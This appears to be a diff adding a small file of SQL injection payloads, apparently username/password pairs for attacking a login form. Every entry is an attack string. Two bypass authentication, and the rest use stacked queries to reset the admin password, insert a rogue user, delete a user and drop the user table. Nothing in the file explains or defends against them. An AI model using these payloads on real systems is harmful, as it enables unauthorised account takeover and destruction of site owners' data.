@@ -1,0 +1,17 @@
+admin'-- 
+abc
+
+' or '1'='1'-- 
+abc
+
+'; update username set password='admin123' where user='admin'-- 
+abc
+
+'; insert into username(user,password) value('emty','abcd')-- 
+abc
+
+'; delete from username where user='emty'-- 
+abc
+
+'; drop table username-- 
+abc
